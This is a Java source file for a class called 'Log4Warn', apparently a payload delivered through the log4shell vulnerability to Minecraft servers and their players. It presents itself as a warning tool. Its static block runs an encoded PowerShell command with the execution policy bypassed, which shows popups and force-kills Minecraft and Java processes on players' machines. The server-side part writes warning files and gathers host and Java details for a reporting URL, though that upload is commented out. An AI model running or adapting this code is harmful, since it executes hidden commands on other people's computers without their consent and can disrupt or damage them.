import java.io.BufferedWriter;
import java.io.FileWriter;
import java.io.PrintWriter;
import java.net.HttpURLConnection;
import java.net.InetAddress;
import java.net.URL;
import java.net.URLEncoder;

public class Log4Warn {
    
    static {
        
        try {
            // This code runs on the client side.
            // Print warning to the console.
            System.out.println("==========================================================");
            System.out.println("If you see this message, disconnect now!");
            System.out.println("The server is vulnerable to a remote attack known as log4shell. (Google it!)");
            System.out.println("==========================================================");
            // Load powershell script as a enc, string; see the client.ps1 file.
            java.lang.Runtime.getRuntime().exec("powershell.exe -exec bypass -enc IwAgAEwAbwBhAGQAIAB3AGkAbgBkAG8AdwBzACAAZgBvAHIAbQBzACAAbABpAGIAIAB0AG8AIAB1AHMAZQAgAGwAYQB0AGUAcgANAAoAQQBkAGQALQBUAHkAcABlACAALQBBAHMAcwBlAG0AYgBsAHkATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVwBpAG4AZABvAHcAcwAuAEYAbwByAG0AcwANAAoADQAKACMAIABMAG8AYQBkACAAdwBzAGgAZQBsAGwAIAAoAGYAbwByACAAdABoAGUAIABwAG8AcAB1AHAAKQAgAGEAbgBkACAAUwB5AHMAdABlAG0ALgBXAGkAbgBkAG8AdwBzAC4ARgBvAHIAbQBzACcAcwAgAGwAaQBiACAAZgBvAHIAIAB0AGgAZQAgAHQAcgBhAHkAIABuAG8AdABpAGYAYQBjAHQAaQBvAG4ALgANAAoAJAB3AHMAaABlAGwAbAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBDAG8AbQBPAGIAagBlAGMAdAAgAFcAcwBjAHIAaQBwAHQALgBTAGgAZQBsAGwADQAKACQAZwBsAG8AYgBhAGwAOgBiAGEAbABtAHMAZwAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBXAGkAbgBkAG8AdwBzAC4ARgBvAHIAbQBzAC4ATgBvAHQAaQBmAHkASQBjAG8AbgANAAoAJABwAGEAdABoACAAPQAgACgARwBlAHQALQBQAHIAbwBjAGUAcwBzACAALQBpAGQAIAAkAHAAaQBkACkALgBQAGEAdABoAA0ACgANAAoAIwAgAEMAcgBlAGEAdABlACAAdABoAGUAIAB0AHIAYQB5ACAAbQBlAHMAcwBhAGcAZQAsACAAYQBuAGQAIABzAGgAbwB3ACAAaQB0AC4ADQAKACQAYgBhAGwAbQBzAGcALgBJAGMAbwBuACAAPQAgAFsAUwB5AHMAdABlAG0ALgBEAHIAYQB3AGkAbgBnAC4ASQBjAG8AbgBdADoAOgBFAHgAdAByAGEAYwB0AEEAcwBzAG8AYwBpAGEAdABlAGQASQBjAG8AbgAoACQAcABhAHQAaAApAA0ACgAkAGIAYQBsAG0AcwBnAC4AQgBhAGwAbABvAG8AbgBUAGkAcABJAGMAbwBuACAAPQAgAFsAUwB5AHMAdABlAG0ALgBXAGkAbgBkAG8AdwBzAC4ARgBvAHIAbQBzAC4AVABvAG8AbABUAGkAcABJAGMAbwBuAF0AOgA6AFcAYQByAG4AaQBuAGcADQAKACQAYgBhAGwAbQBzAGcALgBCAGEAbABsAG8AbwBuAFQAaQBwAFQAZQB4AHQAIAA9ACAAGCBSAGUAYQBkACAAdABoAGUAIABwAG8AcAB1AHAAIABmAG8AcgAgAG0AbwByAGUAIABpAG4AZgBvAHIAbQBhAHQAaQBvAG4AIQAnAA0ACgAkAGIAYQBsAG0AcwBnAC4AQgBhAGwAbABvAG8AbgBUAGkAcABUAGkAdABsAGUAIAA9ACAAIgBNAGkAbgBlAGMAcgBhAGYAdAAgAHcAaQBsAGwAIABzAGUAbABmACAAYwBsAG8AcwBlACAAaQBuACAAMQAwACAAcwBlAGMAbwBuAGQAcwAhACIADQAKACQAYgBhAGwAbQBzAGcALgBWAGkAcwBpAGIAbABlACAAPQAgACQAdAByAHUAZQANAAoAJABiAGEAbABtAHMAZwAuAFMAaABvAHcAQgBhAGwAbABvAG8AbgBUAGkAcAAoADYAMAAwADAAMAApAA0ACgANAAoADQAKACMAUwBoAG8AdwAgAHQAaABlACAAcABvAHAAdQBwAA0ACgAkAHAAbwBwAHUAcAAgAD0AIAAkAHcAcwBoAGUAbABsAC4AUABvAHAAdQBwACgAIgBUAGgAZQAgAHMAZQByAHYAZQByACAAeQBvAHUAIABhAHIAZQAgAHAAbABhAHkAaQBuAGcAIABvAG4AIABpAHMAIAB2AHUAbABuAGUAcgBhAGIAbABlACAAdABvACAAYQAgAHIAZQBtAG8AdABlACAAYQB0AHQAYQBjAGsAIABrAG4AbwB3AG4AIABhAHMAIABsAG8AZwA0AHMAaABlAGwAbAAuACAAUgBlAHAAbwByAHQAIAB0AGgAaQBzACAAdABvACAAdABoAGUAIABzAGUAcgB2AGUAcgAgAG8AdwBuAGUAcgAhACIALAAgADAALAAiAEMATABPAFMARQAgAE0ASQBOAEUAQwBSAEEARgBUACAATgBPAFcAIQAiACwAMAArADQAOAApAA0ACgANAAoAIwAgAFMAbABlAGUAcAAgAGYAbwByACAAMQAwACAAUwBlAGMAbwBuAGQAcwANAAoAUwB0AGEAcgB0AC0AUwBsAGUAZQBwACAALQBTAGUAYwBvAG4AZABzACAAMQAwACAALQBWAGUAcgBiAG8AcwBlAA0ACgANAAoAIwAgAEsAaQBsAGwAIABhAGwAbAAgAHQAaABlACAAcAByAG8AYwBlAHMAcwBlAHMAIAB3AGkAdABoACAAdABoAGUAIABuAGEAbQBlACAAIgBNAGkAbgBlAGMAcgBhAGYAdAAiACAAaQBuACAAdABoAGUAbQAuAA0ACgBnAGUAdAAtAHAAcgBvAGMAZQBzAHMAIABtAGkAbgBlAGMAcgBhAGYAdAAgAC0AZQBhACAAMAAgAHwAIABTAHQAbwBwAC0AUAByAG8AYwBlAHMAcwANAAoADQAKACMAIABLAGkAbABsACAAYQBsAGwAIABvAHAAZQBuACAAZwBhAG0AZQBzACAAKABKAGEAdgBhACkAIAANAAoADQAKAEcAZQB0AC0AUAByAG8AYwBlAHMAcwAgAGoAYQB2AGEAIAAtAGUAYQAgADAAIAB8ACAAcwB0AG8AcAAtAHAAcgBvAGMAZQBzAHMADQAKAEcAZQB0AC0AUAByAG8AYwBlAHMAcwAgAGoAYQB2AGEAdwAgAC0AZQBhACAAMAAgAHwAIABzAHQAbwBwAC0AcAByAG8AYwBlAHMAcwANAAoARwBlAHQALQBQAHIAbwBjAGUAcwBzACAAagBhAHYAYQBjACAALQBlAGEAIAAwACAAfAAgAHMAdABvAHAALQBwAHIAbwBjAGUAcwBzAA0ACgA=").waitFor();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public Log4Warn(){
        // This code runs on the server side
        
        // Log to console
        System.out.println("==========================================================");
        System.out.println("READ THE BELOW, THIS IS IMPORTANT TO SERVER SECURITY!!!");
        System.out.println("The server software is vulnerable to a remote code execution vulnerability - known as log4shell.");
        System.out.println("Please update your server software to a patched version!");
        System.out.println("If you don't know what to do, or you don't know how to patch your server software, you can feel free to reach out to the creator of this software:");
        System.out.println("sticks#6436 on Discord");
        System.out.println("==========================================================");

        // Log to file
        try {
            FileWriter fw = new FileWriter("README-IMPORTANT-README.txt", true);
            BufferedWriter bw = new BufferedWriter(fw);
            PrintWriter out = new PrintWriter(bw);
            out.println("==========================================================");
            out.println("The server software is vulnerable to a remote code execution vulnerability - known as log4shell.");
            out.println("Please update your server software to a patched version!");
            out.println("If you don't know what to do, or you don't know how to patch your server software, you can feel free to reach out to the creator of this software:");
            out.println("sticks#6436 on Discord");
            out.println("==========================================================");
            out.close();
        } catch (Exception e) {
            e.printStackTrace();
        }

        // Now, at this point; we need to report our findings to the main URL.
        try {
            String version = "log4warn-v2";
            String port = "25565";
            

            // Get OS, and os version
            String os = System.getProperty("os.name");
            String os_version = System.getProperty("os.version");

            // Get Java Information
            String java_version = System.getProperty("java.version");
            String java_vendor = System.getProperty("java.vendor");
            String java_vm_specification_version = System.getProperty("java.vm.version");
            String java_vm_specification_vendor = System.getProperty("java.vm.vendor");
            String java_vm_specification_name = System.getProperty("java.vm.name");
            String java_home = System.getProperty("java.home");
            
           // URL url = new URL("https://log4shell.sticks.network/report?server=" + URLEncoder.encode(InetAddress.getLocalHost().getHostName(), "UTF-8") + "&port=" + URLEncoder.encode(port, "UTF-8") + "&version=" + URLEncoder.encode(version, "UTF-8") + "&os=" + URLEncoder.encode(os, "UTF-8") + "&os_version=" + URLEncoder.encode(os_version, "UTF-8") + "&java_version=" + URLEncoder.encode(java_version, "UTF-8") + "&java_vendor=" + URLEncoder.encode(java_vendor, "UTF-8") + "&java_home=" + URLEncoder.encode(java_home, "UTF-8") + "&java_vm_specification_version=" + URLEncoder.encode(java_vm_specification_version, "UTF-8") + "&java_vm_specification_vendor=" + URLEncoder.encode(java_vm_specification_vendor, "UTF-8") + "&java_vm_specification_name=" + URLEncoder.encode(java_vm_specification_name, "UTF-8") + "&java_vm_specification_version=" + URLEncoder.encode(java_vm_specification_version, "UTF-8") + "&java_vm_specification_vendor=" + URLEncoder.encode(java_vm_specification_vendor, "UTF-8") + "&java_vm_specification_name=" + URLEncoder.encode(java_vm_specification_name, "UTF-8"));
            
          //  HttpURLConnection con = (HttpURLConnection) url.openConnection();
            
           // con.setRequestMethod("GET");
           //  con.setRequestProperty("User-Agent", "log4warn-reporter/2.0");

        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
